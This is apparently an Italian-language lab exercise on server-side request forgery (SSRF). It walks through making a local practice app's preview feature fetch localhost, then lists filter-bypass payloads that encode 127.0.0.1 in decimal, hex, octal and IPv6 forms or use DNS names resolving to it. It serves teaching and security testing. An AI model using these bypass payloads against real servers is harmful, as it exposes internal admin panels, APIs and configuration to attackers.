🏠 Esercizio 1: Accesso a Localhost

Il primo test SSRF – raggiungere ciò che non dovresti
🎯 L'Obiettivo
Il server può raggiungere localhost – risorse che noi dall'esterno non possiamo vedere.

Cosa possiamo trovare?
• Pannelli admin interni
• API non esposte
• Servizi di debug
• File di configurazione
📝 L'Attacco Base
Step 1: Accedi a http://localhost:8010

Step 2: Login: admin/password

Step 3: Vai su "Crea Preview"

Step 4: Inserisci:
http://localhost

Risultato: Il server fetcha localhost e mostra il contenuto!
🔄 Varianti di Localhost
Se localhost è bloccato, prova queste alternative:
http://127.0.0.1 # IP standard http://127.1 # Shortened IP http://[::1] # IPv6 localhost http://2130706433 # Decimal IP (127.0.0.1) http://0x7f000001 # Hex IP http://0177.0.0.1 # Octal IP http://127.0.0.1.nip.io # DNS che risolve a 127.0.0.1 http://localtest.me # DNS che risolve a 127.0.0.1
